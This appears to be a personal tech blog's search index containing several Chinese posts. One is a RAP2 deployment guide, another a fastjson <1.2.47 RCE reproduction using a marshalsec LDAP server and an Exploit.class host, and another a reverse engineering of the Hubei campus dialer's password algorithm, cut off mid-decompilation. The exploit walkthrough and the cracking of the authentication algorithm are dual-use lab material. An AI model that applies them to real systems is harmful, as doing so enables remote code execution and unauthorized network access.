<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>RAP2 前后端开发利器搭建</title>
    <url>/2019/10/12/rap2-api-manage-building.html</url>
    <content><![CDATA[<p>RAP2 是一个api管理系统，前后端协作开发的利器。</p>
<p>在线体验地址<a href="http://rap2.taobao.org" target="_blank" rel="noopener">http://rap2.taobao.org</a></p>
<p>Web接口管理工具，开源免费，接口自动化，MOCK数据自动生成，自动化测试，企业级管理。</p>
<p>有一份一键搭建的docker-compose.yml，但是已经是比较老的前端了，具体可以查看<a href="https://hub.docker.com/r/taomaree/rap2" target="_blank" rel="noopener">https://hub.docker.com/r/taomaree/rap2</a></p>
<p>我这里把他的docker-compose.yml贴出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version: &apos;2.2&apos;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  delos:</span><br><span class="line">    container_name: rap2-delos</span><br><span class="line">    image: taomaree/rap2:1.0.6</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_URL=rap2-mysql</span><br><span class="line">      - MYSQL_PORT=3306</span><br><span class="line">      - MYSQL_USERNAME=rap2</span><br><span class="line">      - MYSQL_PASSWD=rap2delos</span><br><span class="line">      - MYSQL_SCHEMA=RAP2_DELOS_APP</span><br><span class="line">      - REDIS_URL=rap2-redis</span><br><span class="line">      - REDIS_PORT=6379</span><br><span class="line">      - NODE_ENV=production</span><br><span class="line">    working_dir: /app/rap2-delos/dist</span><br><span class="line">    volumes:</span><br><span class="line">      - &quot;/srv/rap2-mysql/mysql-backup:/backup&quot;</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;38080:80&quot;  # expose 38080</span><br><span class="line">    links:</span><br><span class="line">      - redis</span><br><span class="line">      - mysql</span><br><span class="line">    depends_on:</span><br><span class="line">      - redis</span><br><span class="line">      - mysql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  redis:</span><br><span class="line">    container_name: rap2-redis</span><br><span class="line">    image: redis:4.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  mysql:</span><br><span class="line">    container_name: rap2-mysql</span><br><span class="line">    image: mysql:8.0</span><br><span class="line">    #ports:</span><br><span class="line">    #   - 33306:3306</span><br><span class="line">    volumes:</span><br><span class="line">      - &quot;/srv/rap2-mysql/mysql-data:/var/lib/mysql&quot;</span><br><span class="line">    command: mysqld --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci --init-connect=&apos;SET NAMES utf8mb4;&apos; --default-authentication-plugin=mysql_native_password --innodb-flush-log-at-trx-commit=0 </span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_ALLOW_EMPTY_PASSWORD=yes</span><br><span class="line">      - MYSQL_DATABASE=RAP2_DELOS_APP</span><br><span class="line">      - MYSQL_USER=rap2</span><br><span class="line">      - MYSQL_PASSWORD=rap2delos</span><br><span class="line"></span><br><span class="line">  rap2-init:</span><br><span class="line">    container_name: rap2-init</span><br><span class="line">    image: taomaree/rap2:1.0.6</span><br><span class="line">    environment:</span><br><span class="line">      - MYSQL_URL=rap2-mysql</span><br><span class="line">      - MYSQL_PORT=3306</span><br><span class="line">      - MYSQL_USERNAME=rap2</span><br><span class="line">      - MYSQL_PASSWD=rap2delos</span><br><span class="line">      - MYSQL_SCHEMA=RAP2_DELOS_APP</span><br><span class="line">      - REDIS_URL=rap2-redis</span><br><span class="line">      - REDIS_PORT=6379</span><br><span class="line">      - NODE_ENV=production</span><br><span class="line">    working_dir: /app/rap2-delos</span><br><span class="line">    #command: &apos;mysql -h$&#123;MYSQL_URL&#125; -u$&#123;MYSQL_USERNAME&#125; -p$&#123;MYSQL_PASSWD&#125; -e &quot;select * from $&#123;MYSQL_SCHEMA&#125;.Users;&quot; || npm run create-db&apos;</span><br><span class="line">    command: [&quot;bash&quot;, &quot;-c&quot;, &quot;sleep 30 &amp;&amp; mysql -h$$&#123;MYSQL_URL&#125; -u$$&#123;MYSQL_USERNAME&#125; -p$$&#123;MYSQL_PASSWD&#125; -e \&quot;select * from $$&#123;MYSQL_SCHEMA&#125;.Users;\&quot; || node dist/scripts/init&quot;]</span><br><span class="line">    links:</span><br><span class="line">      - redis</span><br><span class="line">      - mysql</span><br><span class="line">    depends_on:</span><br><span class="line">      - redis</span><br><span class="line">      - mysql</span><br></pre></td></tr></table></figure>
<p>注意一下数据挂载目录就行了。然后访问38080端口就ok了</p>
<p>但是我想要最新的前端。</p>
<p>这个搭建是稍微有点复杂的</p>
<p>启动后端</p>
<p>使用官方贴出的docker-compose.yml</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir rap2</span><br><span class="line">cd rap2</span><br><span class="line"></span><br><span class="line">wget -c https://raw.githubusercontent.com/thx/rap2-delos/master/docker-compose.yml</span><br><span class="line"></span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>docker起来后，默认是监听38080端口，你可以按照自己的喜好编辑docker-compose.yml，并且这个是允许跨域的，跨域规则比较松，Allow-Origin是*，所以你可以把前端部署在任何地方，不过我习惯部署在同一个域名下。</p>
<p>部署前端</p>
<p>首先下载前端</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/thx/rap2-dolores.git</span><br></pre></td></tr></table></figure>
<p>然后修改前端的配置，这一步是为了与后端对接</p>
<p>我是打算把整个服务部署在 mock.test.com 域名下，然后 <a href="http://mock.test.com/api" target="_blank" rel="noopener">http://mock.test.com/api</a> 作为接口的根url（这里需要靠nginx来重写）</p>
<p>那么我们需要修改前端的配置文件</p>
<p>进入我们刚才clone下来的目录 rap2-dolores/src/config下，修改 config.prod.ts 文件</p>
<p><img src="./img/1106918-20191012205633755-1398708534.png" alt=""></p>
<p>只需要修改 serve 字段的值即可。</p>
<p>然后编译前端，这里我使用淘宝的源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd rap2-dolores</span><br><span class="line"></span><br><span class="line">npm  install --registry=https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line">npm run build</span><br></pre></td></tr></table></figure>
<p>编译完成后，rap2-dolores 目录下会出现一个名字为 build 或者 dist 的文件夹，把这个文件夹放到你刚才放docker-compose.yml的目录下（为了以后迁移方便，可以放在任意位置，只需要修改对应的nginx配置即可）</p>
<p>这里我假定编译出来的是 build 文件夹，放置到docker-compose.yml所在的目录</p>
<p>那么现在你的目录结构应该是这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lab@lab-desktop:~/dockers/rap2$ pwd</span><br><span class="line">/home/lab/dockers/rap2</span><br><span class="line">lab@lab-desktop:~/dockers/rap2$ tree -L 1</span><br><span class="line">.</span><br><span class="line">├── docker-compose.yml</span><br><span class="line">├── build</span><br><span class="line">└── docker</span><br><span class="line"></span><br><span class="line">2 directories, 1 file</span><br></pre></td></tr></table></figure>
<p>然后新建nginx配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/nginx/sites-enabled/mock.test.com.conf</span><br></pre></td></tr></table></figure>
<p>写入以下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        listen [::]:80;</span><br><span class="line"></span><br><span class="line">        server_name mock.test.com;</span><br><span class="line">        root /home/lab/dockers/rap2/build;</span><br><span class="line"></span><br><span class="line">        # reverse proxy</span><br><span class="line">        location /api/ &#123;</span><br><span class="line">                # 38080后面加/是为了把http://127.0.0.1:38080/api/*反代到http://127.0.0.1:38080/*</span><br><span class="line">                proxy_pass http://127.0.0.1:38080/;  # 38080后面的/是必要的，是否会附加location配置路径与proxy_pass配置的路径后是否有&quot;/&quot;有关，有&quot;/&quot;则不附加</span><br><span class="line">                # 代理配置，可选</span><br><span class="line">                proxy_http_version      1.1;</span><br><span class="line">                proxy_cache_bypass      $http_upgrade;</span><br><span class="line">                </span><br><span class="line">                proxy_set_header Upgrade                        $http_upgrade;</span><br><span class="line">                proxy_set_header Connection             &quot;upgrade&quot;;</span><br><span class="line">                proxy_set_header Host                           $host;</span><br><span class="line">                proxy_set_header X-Real-IP                      $remote_addr;</span><br><span class="line">                proxy_set_header X-Forwarded-For        $proxy_add_x_forwarded_for;</span><br><span class="line">                proxy_set_header X-Forwarded-Proto      $scheme;</span><br><span class="line">                proxy_set_header X-Forwarded-Host       $host;</span><br><span class="line">                proxy_set_header X-Forwarded-Port       $server_port;</span><br><span class="line">        &#125;</span><br><span class="line">        location / &#123;</span><br><span class="line">                # 路由在前端，后端没有真实路由，在路由不存在的 404状态的页面返回 /index.html</span><br><span class="line">                # 这个方式使用场景，你在写React或者Vue项目的时候，没有真实路由</span><br><span class="line">                try_files $uri /index.html;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后重启一下nginx，访问mock.test.com就可以了</p>
<p>这里给出一份比较详尽的nginx配置教程</p>
<ul>
<li>Nginx 代理转发，让生产和测试环境 React、Vue 项目轻松访问 API，前端路由不再 404 <a href="https://juejin.im/entry/58df166a0ce463005821e9d9" target="_blank" rel="noopener">https://juejin.im/entry/58df166a0ce463005821e9d9</a></li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li><a href="https://blog.csdn.net/zhangliangzi/article/details/78257593" target="_blank" rel="noopener">Nginx——location常见配置指令，alias、root、proxy_pass</a></li>
<li><a href="https://github.com/taomaree/docker-rap2" target="_blank" rel="noopener">https://github.com/taomaree/docker-rap2</a></li>
<li><a href="https://github.com/thx/rap2-delos/wiki/docker" target="_blank" rel="noopener">https://github.com/thx/rap2-delos/wiki/docker</a></li>
<li><a href="https://github.com/thx/rap2-delos/issues/119#issuecomment-392762261" target="_blank" rel="noopener">https://github.com/thx/rap2-delos/issues/119#issuecomment-392762261</a></li>
<li><a href="https://github.com/thx/rap2-dolores" target="_blank" rel="noopener">https://github.com/thx/rap2-dolores</a></li>
<li><a href="https://incoder.org/2018/03/27/rap2/" target="_blank" rel="noopener">Api 文档管理系统 RAP2环境搭建</a></li>
</ul>
]]></content>
      <categories>
        <category>配置与搭建</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
        <tag>配置与搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson<1.2.47 RCE 漏洞复现</title>
    <url>/2019/07/15/fastjson-under-1.2.47-rce.html</url>
    <content><![CDATA[<p>这两天爆出了 fastjson 的老洞，复现简单记录一下。</p>
<p>首先使用 spark 搭建一个简易的利用 fastjson 解析 json 的 http server。</p>
<a id="more"></a>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.hacktech.fastjsonserver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> spark.Spark.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        get(<span class="string">"/hello"</span>, (req, res) -&gt; <span class="string">"spark server start success"</span>);</span><br><span class="line">        post(<span class="string">"/test"</span>, (req, res) -&gt; &#123;</span><br><span class="line">            String payload = req.body();</span><br><span class="line">            JSON.parse(payload);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"json payload："</span> + payload;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译出来后，启动这个 jar，在 <code>/test</code> 这个 post 点即可 post json payload。</p>
<p>然后这里分两类：</p>
<ol>
<li>如果只是想检测漏洞是否存在，可以使用 dnslog 去检测</li>
<li>利用的话，需要自己起一个恶意的 ldap 或者 rmi 服务</li>
</ol>
<p>本机需要起一个 LDAP 服务和 http 服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">poc--&gt;LDAP--&gt;http</span><br></pre></td></tr></table></figure>
<p>poc 会通过上面的路径去请求你的 http 服务上面的对应的 class 文件然后去解析执行这个 class</p>
<p>启动 LDAP 用的 marshalsec，会比较方便。</p>
<ol>
<li>在本目录下启动 http server 在 80 端口</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>启动 LDAP 服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/#Exploit</span><br></pre></td></tr></table></figure>
<p>后面的 Exploit 是指 Exploit.class 文件</p>
<ol start="3">
<li>运行 PoC，它会请求 LDAP 服务，或者直接把 json payload post 到 <code>/test</code></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp fastjson-1.2.47.jar; PoC</span><br></pre></td></tr></table></figure>
<p>其中代码编译的话，直接执行 <code>javac the.java</code> 即可，不过 PoC.java 的编译需要引入 fastjson jar 包，运行 <code>javac -cp ./fastjson-1.2.47.jar PoC.java</code></p>
<p>具体的细节可见<a href="https://www.lanzous.com/i4zzqej" target="_blank" rel="noopener">代码打包文件</a></p>
<h2 id="复现遇到一些坑"><a href="#复现遇到一些坑" class="headerlink" title="复现遇到一些坑"></a>复现遇到一些坑</h2><p>这次的这个洞是有 jdk 版本要求的。</p>
<p>最开始我在我本机测试通过，原因是因为它请求不到 class 的时候会去本目录下进行一个查找，也就是并没有经过 http 服务器。</p>
<p>所以想要复现这个漏洞的话，需要 target 主机上面的 jdk 版本有严格的要求，具体见下图</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190716164141951_25963.png" alt=""></p>
<p>所以建议复现流程是</p>
<h2 id="建议复现流程"><a href="#建议复现流程" class="headerlink" title="建议复现流程"></a>建议复现流程</h2><ol>
<li>起一个虚拟机专门用来运行我写的那个简易的 fastjsonserver，或者你可以直接在虚拟机上面执行 PoC，关键在于 target 机器的 jdk 版本。</li>
<li>你可以在本机起 ldap/rmi 服务以及 http 服务，或者全部在虚拟机上运行也可以，但是一般真实情况下我们是在外部构造恶意的 ldap/rmi 以及 http server，所以建议这步放到虚拟机外运行。</li>
<li>根据你的网络环境修改 PoC。</li>
<li>然后 post payload 或者运行 PoC，即可看到虚拟机上弹出了计算器。</li>
</ol>
<p><strong>低版本的java 8u112</strong><br>链接: <a href="https://pan.baidu.com/s/1Q3lGG2b4I8aTXpQbmvK2dw" target="_blank" rel="noopener">https://pan.baidu.com/s/1Q3lGG2b4I8aTXpQbmvK2dw</a> 提取码: 36mm</p>
<p><strong>复现视频链接</strong>：<a href="https://www.lanzous.com/i50ip3g" target="_blank" rel="noopener">复现流程.zip</a></p>
]]></content>
      <categories>
        <category>Hacker</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>Bad owner or permissions on .ssh/config win10问题解决</title>
    <url>/2019/07/15/bad-owner-or-permissions-ssh-win10.html</url>
    <content><![CDATA[<p>最近向系统添加了新用户账号后出现了问题，尝试使用私钥登陆服务器，提示了 Bad owner or permissions on .ssh/config 这个报错，就是如题中的问题</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/1106918-20190715102859616-1893463244.png" alt=""></p>
<a id="more"></a>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>按照Windows 10 GUI中的这些步骤解决权限问题：</p>
<ol>
<li>找到.ssh文件夹。它通常位于C:\Users\，例如C:\Users\Akkuman。</li>
<li>右键单击.ssh文件夹，然后单击“属性”。</li>
<li>找到并点击“安全”标签。</li>
<li>然后单击“高级”。</li>
<li>单击“禁用继承”，单击“确定”。</li>
<li>将出现警告弹出窗口。单击“从此对象中删除所有继承的权限”。</li>
<li>你会注意到所有用户都将被删除。让我们添加所有者。在同一窗口中，单击“编辑”按钮。</li>
<li>接下来，单击“添加”以显示“选择用户或组”窗口。</li>
<li>单击“高级”，然后单击“立即查找”按钮。应显示用户结果列表。</li>
<li>选择您的用户帐户。</li>
</ol>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/微信截图_20190715111545.png" alt=""></p>
<ol start="11">
<li>然后单击“确定”（大约三次）以关闭所有窗口。</li>
</ol>
<p>完成所有操作后，再次关闭并打开cmder应用程序并尝试连接到远程SSH主机。</p>
<p>现在这个问题应该解决了。</p>
]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
      </tags>
  </entry>
  <entry>
    <title>git彻底删除或变更子模块</title>
    <url>/2019/05/23/git-rm-or-change-submodule.html</url>
    <content><![CDATA[<p>今天遇到一个很怪的问题，我想把我的一个子模块切换到另一个上游，我按照网上的方法删除子模块然后新建后，这个子模块依旧跟踪着我先前的上游。自己摸索了一下，可能方法比较傻，不过是可行的，希望能给大家一些帮助。</p>
<a id="more"></a>
<ol>
<li>使原先子模块不被版本控制（先把子模块从版本控制系统移除）</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git rm --cached /path/to/files</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>删除子模块目录</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm -rf /path/to/files</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>修改 .gitmodules，移除这个 submodule</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-[submodule &quot;themes/next&quot;]</span><br><span class="line">-	path = themes/next</span><br><span class="line">-	url = https://github.com/theme-next/hexo-theme-next.git</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>修改 <code>.git/config</code> 内容，把需要删除的 submodule 配置项删除</li>
<li>修改 <code>.git/modules</code> 文件夹内容，把你想要删除的子模块目录删除（这项十分重要，或者你知道怎么修改也可以修改，不然导致的后果就是你改过来的同名子模块依然跟踪着之前的分支，git pull 也没法拉取你在 .gitmosules 中新定义的上游地址）</li>
<li>后面再按照普通的方法添加子模块即可</li>
</ol>
<p>一些子模块的操作可以参见<a href="https://blog.chh.tw/posts/git-submodule/" target="_blank" rel="noopener">Git Submodule 用法筆記</a></p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>湖北校园网PC端拨号算法逆向</title>
    <url>/2019/05/21/re-hubei-feiyoung-pc-version.html</url>
    <content><![CDATA[<h1 id="湖北校园网PC端拨号算法逆向"><a href="#湖北校园网PC端拨号算法逆向" class="headerlink" title="湖北校园网PC端拨号算法逆向"></a>湖北校园网PC端拨号算法逆向</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一文 <a href="https://www.anquanke.com/post/id/178484" target="_blank" rel="noopener">PPPoE中间人拦截以及校园网突破漫谈</a>我们谈到使用 PPPoE 拦截来获取真实的账号密码。<br>在这个的基础上，我对我们湖北的客户端进行了逆向，得到了拨号加密算法。</p>
<a id="more"></a>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>首先查壳，发现这个版本没壳了，我记得之前好像是加过 vmp 的呀，不管了。<br>然后我们看看目录下的 dll 导出表看看有没有什么好东西</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521135332_AidcComm_Export.png" alt=""></p>
<p>AidcComm.dll 里面有这些东西，看来这个极大可能会是我们的目标。</p>
<p>我们再看看主程序的导入表，发现主程序的导入表里面并没有这个 dll，那我们动态调试的时候应该怎么断到这个 dll 中去呢。<br>没有导入表说明没有 .lib，那有可能是通过 LoadLibrary 加载的 dll，至于自实现 peloader，我觉得应该这个软件应该不会是这样。<br>看看就知道了。<br>直接用 x32dbg 和 IDA 开始看。</p>
<h2 id="逆向过程"><a href="#逆向过程" class="headerlink" title="逆向过程"></a>逆向过程</h2><p>x32dbg 打开主程序，然后 <code>bp LoadLibraryW</code>，再重新载入程序，我们可以一步步运行发现 AidcComm.dll 被载入了。<br>然后运行到用户代码处</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521140452_x32dbg_load_aidccomm.png" alt=""></p>
<p>我们可以看到此时 eax 寄存器的值为 55870000，这个就是 LoadLibrary 返回的 HANDLE。一般思路来说，接下来就是用 GetProcAddress 获取导出表函数的地址了。<br>继续往下走几步，即可发现我们的猜测并没有错误。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521141007.png" alt=""></p>
<p>从这张图我们可以看到主程序获取了 AidcComm.GetPWD 和 AidcComm.GetRegularAccount 的地址。<br>那我们通过 call 之后的 eax 跳转过去在这两个函数的地址下断，直接跑起来。<br>然后我们会发现在 AidcComm.GetRegularAccount 断下来了，传入的参数可以在堆栈窗口中看到。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521142139.png" alt=""></p>
<p>我们去 IDA 分析 GetRegularAccount 这个函数，同时在调试器这边动态跟（这个我已经分析过了，所以有的变量和函数名我已经改过了）</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521142257.png" alt=""></p>
<p>首先最直观的就是账号的变换，账号只需要加上前缀 <code>!^Wnds0</code> 即可（但其实加密出来后，主程序这个给它又加了一个后缀 <code>@hbxy</code>）。（从调试器可以看到）<br>密码我们直接跟到 GetPWD 里面去看。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521143020.png" alt=""></p>
<p>通过调试器我们可以观察出，这个分支结构只会执行 <code>a2 == 1</code> 这个分支。<br>看来是通过下面这个函数加密的了。（我给他改了名 encryptPwdWithKey）<br>我们进到 <code>encryptPwdWithKey(void *password, char *key, rsize_t SizeInBytes)</code> 这个函数去查看。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521143504.png" alt=""></p>
<p>通过分析我们可以得出大致上的流程</p>
<ol>
<li>password 用 key RC4 一下得到 A</li>
<li>把 A md5 一下得到 B，如果第 11 位为奇数，取 B 的前 16 位，偶数就后 16 位，得到 C</li>
<li>C 再用 key RC4 一下得到 D</li>
<li>D 再 md5 一下，取 [8:24]得到 E</li>
</ol>
<p>也就是最后得到的 E 是加密之后的。</p>
<p>可能有的小伙伴不明白为什么会是 RC4，这里有几个提示的地方，第一是这个字符串的提示，第二是 RC4 加密流程是很容易分辨的，这个靠经验了。</p>
<p>但是我们发现我们截取出来的密码和这个是有点小不一样的。通过调试，可以看到在 GetRegularAccount 函数加密出来后，又调用了一个函数，这个函数我给它重命名为 fixHBKey 了。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521144314.png" alt=""></p>
<p>我们跟进去看看</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521144424.png" alt=""></p>
<p>代码并不长，我们可以直接调试器分析，如果你想用 IDA 也是可以的，IDA 可以搜索上图中的 <code>&lt;&lt;&lt; FixHBKey: %s &lt;&lt;&lt;</code> 这个字符串来定位这个函数。<br>或者我们可以看到这个函数的入口地址为 <code>001115D0</code>，这个 exe 的加载基址我们可以往上滑到顶看到为 <code>000F1000</code>，两个之间的差值为 <code>205D0</code>，<br>然后再把这个差值加上 IDA 加载的基址，即可找到这个函数。</p>
<p>这个函数的大致作用就是修改上面我们得到的 E</p>
<ul>
<li>E[今天几号日期 % 16] 替换为 ‘b’ 得到最后的密码</li>
</ul>
<p>这块我们是搞清楚了，那 key 是怎么来的呢。<br>这个我们就需要大量借助调试器了，我们重启一下主程序，然后在上面的分析基础上找到这个 key 第一次出现的地方，我们可以发现<br>在 AidcRes 偏移 10110 处即为 key 的生成函数。</p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/20190521150058.png" alt=""></p>
<p>这个函数巨长，同样的，我们借助之前的方法在 IDA 中找到这个函数，我这里直接按偏移，可以看到在 sub_420110 即为我们的加密函数，<br>这里我已经重命名为 generateKey。</p>
<p>这个函数太长了，我无法截全图，我直接丢代码然后分析，这里分析建议大家调试结合代码来看，不然一头雾水。其中大量的必要变量和函数我已经重命名，方便大家阅读。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">thiscall <span class="title">generateKey</span><span class="params">(<span class="keyword">char</span> *<span class="keyword">this</span>, <span class="keyword">int</span> a2, <span class="keyword">char</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">int</span> a6, <span class="keyword">int</span> a7, <span class="keyword">int</span> a8)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp+8h] [ebp-37Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v12; <span class="comment">// [esp+20h] [ebp-364h]</span></span><br><span class="line">  <span class="keyword">int</span> len_username_b_MonthDay; <span class="comment">// [esp+24h] [ebp-360h]</span></span><br><span class="line">  <span class="keyword">char</span> *v14; <span class="comment">// [esp+28h] [ebp-35Ch]</span></span><br><span class="line">  <span class="keyword">int</span> len_bUsernameMonthDay; <span class="comment">// [esp+2Ch] [ebp-358h]</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// [esp+30h] [ebp-354h]</span></span><br><span class="line">  <span class="keyword">char</span> *mem_17; <span class="comment">// [esp+34h] [ebp-350h]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [esp+38h] [ebp-34Ch]</span></span><br><span class="line">  <span class="keyword">int</span> lenMonthDay; <span class="comment">// [esp+3Ch] [ebp-348h]</span></span><br><span class="line">  <span class="keyword">int</span> lenUsername; <span class="comment">// [esp+40h] [ebp-344h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [esp+44h] [ebp-340h]</span></span><br><span class="line">  <span class="keyword">int</span> v22; <span class="comment">// [esp+48h] [ebp-33Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v23; <span class="comment">// [esp+4Ch] [ebp-338h]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [esp+50h] [ebp-334h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v25; <span class="comment">// [esp+54h] [ebp-330h]</span></span><br><span class="line">  <span class="keyword">int</span> len_HbKeyGa; <span class="comment">// [esp+58h] [ebp-32Ch]</span></span><br><span class="line">  <span class="keyword">int</span> lenHbKeyGa; <span class="comment">// [esp+5Ch] [ebp-328h]</span></span><br><span class="line">  <span class="keyword">char</span> *pMem_64_a; <span class="comment">// [esp+60h] [ebp-324h]</span></span><br><span class="line">  <span class="keyword">int</span> len_HbKeyGb; <span class="comment">// [esp+64h] [ebp-320h]</span></span><br><span class="line">  <span class="keyword">int</span> lenHbKeyGb; <span class="comment">// [esp+68h] [ebp-31Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *pMem_64_b; <span class="comment">// [esp+6Ch] [ebp-318h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [esp+70h] [ebp-314h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [esp+74h] [ebp-310h]</span></span><br><span class="line">  <span class="keyword">int</span> v34; <span class="comment">// [esp+78h] [ebp-30Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v35; <span class="comment">// [esp+7Ch] [ebp-308h]</span></span><br><span class="line">  <span class="keyword">int</span> len_monthDay_Username_b; <span class="comment">// [esp+80h] [ebp-304h]</span></span><br><span class="line">  <span class="keyword">char</span> *v37; <span class="comment">// [esp+84h] [ebp-300h]</span></span><br><span class="line">  <span class="keyword">int</span> len_username_MonthDay_b; <span class="comment">// [esp+88h] [ebp-2FCh]</span></span><br><span class="line">  LPVOID lp_mix_md5_1; <span class="comment">// [esp+8Ch] [ebp-2F8h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v40; <span class="comment">// [esp+90h] [ebp-2F4h]</span></span><br><span class="line">  <span class="keyword">int</span> v41; <span class="comment">// [esp+94h] [ebp-2F0h]</span></span><br><span class="line">  LPVOID v42; <span class="comment">// [esp+98h] [ebp-2ECh]</span></span><br><span class="line">  LPVOID v43; <span class="comment">// [esp+9Ch] [ebp-2E8h]</span></span><br><span class="line">  LPVOID v44; <span class="comment">// [esp+A0h] [ebp-2E4h]</span></span><br><span class="line">  <span class="keyword">int</span> index3; <span class="comment">// [esp+A4h] [ebp-2E0h]</span></span><br><span class="line">  <span class="keyword">int</span> index2; <span class="comment">// [esp+A8h] [ebp-2DCh]</span></span><br><span class="line">  <span class="keyword">char</span> *pHbKeyGa; <span class="comment">// [esp+ACh] [ebp-2D8h]</span></span><br><span class="line">  <span class="keyword">int</span> index6; <span class="comment">// [esp+B0h] [ebp-2D4h]</span></span><br><span class="line">  <span class="keyword">int</span> index5; <span class="comment">// [esp+B4h] [ebp-2D0h]</span></span><br><span class="line">  _DWORD *md5_monthDay_Username_b; <span class="comment">// [esp+B8h] [ebp-2CCh]</span></span><br><span class="line">  _DWORD *md5_username_b_MonthDay; <span class="comment">// [esp+BCh] [ebp-2C8h]</span></span><br><span class="line">  _DWORD *md5_username_MonthDay_b; <span class="comment">// [esp+C0h] [ebp-2C4h]</span></span><br><span class="line">  <span class="keyword">void</span> *mix_md5_1; <span class="comment">// [esp+C4h] [ebp-2C0h]</span></span><br><span class="line">  <span class="keyword">int</span> md5_1_pLus3remainder4; <span class="comment">// [esp+C8h] [ebp-2BCh]</span></span><br><span class="line">  <span class="keyword">int</span> md5_bUsernameMonthDay; 